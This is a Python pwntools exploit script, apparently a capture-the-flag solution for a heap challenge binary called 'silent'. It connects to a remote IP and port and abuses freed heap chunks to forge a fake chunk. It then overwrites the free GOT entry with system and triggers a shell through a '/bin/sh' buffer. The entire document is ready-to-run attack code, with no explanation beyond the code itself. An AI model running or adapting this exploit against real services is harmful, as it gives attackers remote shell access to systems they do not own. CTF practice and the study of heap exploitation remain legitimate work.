
from pwn import *

context.arch = "amd64"
#context.log_level = "debug"

s = remote("39.107.32.132", "10000")
#s = process("./silent")
elf = ELF("./silent")

def mymalloc(l,con):
    s.sendline("1")
    sleep(0.2)
    s.sendline(str(l))
    sleep(0.2)
    s.send(con)

def myfree(idx):
    s.sendline("2")
    sleep(0.2)
    s.sendline(str(idx))

def mywrite(idx,con1,con2):
    s.sendline("3")
    sleep(0.2)
    s.sendline(str(idx))
    sleep(0.2)
    s.send(con1)
    sleep(0.2)
    s.send(con2)

free_got = elf.got["free"]
system_addr = elf.symbols["system"]
bss_addr = 0x0000000000602120

mymalloc(0x60,"AAAA".ljust(0x5F, 'a'))
sleep(1)
mymalloc(0x60,"AAAA".ljust(0x5F, 'a'))
sleep(1)
mymalloc(0x60,"AAAA".ljust(0x5F, 'a'))
sleep(1)
myfree(0)
sleep(1)
myfree(1)
sleep(1)
myfree(2)
sleep(1)

fake_chunk = p64(0) + p64(0x71)
fake_chunk = fake_chunk.ljust(0x2F, 'k')
mywrite(2, p64(0x6020A5-8)[:3] + chr(0), fake_chunk)
sleep(1)
padding = "/bin/sh\x00" + 'a'*0xb
padding += p64(0x602018)
mymalloc(0x60, padding)
sleep(1)
mymalloc(0x60, padding)
sleep(1)
mywrite(0, p64(system_addr), p64(system_addr))
sleep(1)
myfree(4)
sleep(1)

s.interactive()

